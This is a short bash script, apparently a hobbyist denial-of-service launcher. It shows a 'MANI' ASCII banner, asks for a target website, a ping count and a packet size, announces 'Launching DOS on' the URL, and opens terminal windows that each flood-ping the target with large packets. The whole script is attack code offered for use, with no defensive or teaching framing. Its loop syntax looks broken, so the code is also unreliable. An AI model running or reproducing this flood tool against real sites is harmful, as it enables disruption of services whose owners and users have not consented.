#!/bin/bash
echo "                               _______      "
echo "   |\    /|     /\     |\    |    |         "
echo "   | \  / |    /  \    | \   |    |         "
echo "   |  \/  |   /____\   |  \  |    |         "
echo "   |      |  /      \  |   \ |    |         "
echo "   |      | /        \ |    \| ___|___      "
echo "                                            "
echo "Enter the URL of website: "
read URL
  echo "Enter the number of pings: "
read pings
echo "Enter the packet size :"
read size
echo "Launching DOS on ........... $URL"
for i in {1..$pings}
do
  gnome-terminal -x sh -c "ping $URL -f -l 50000 -s $size ; exec bash"
done
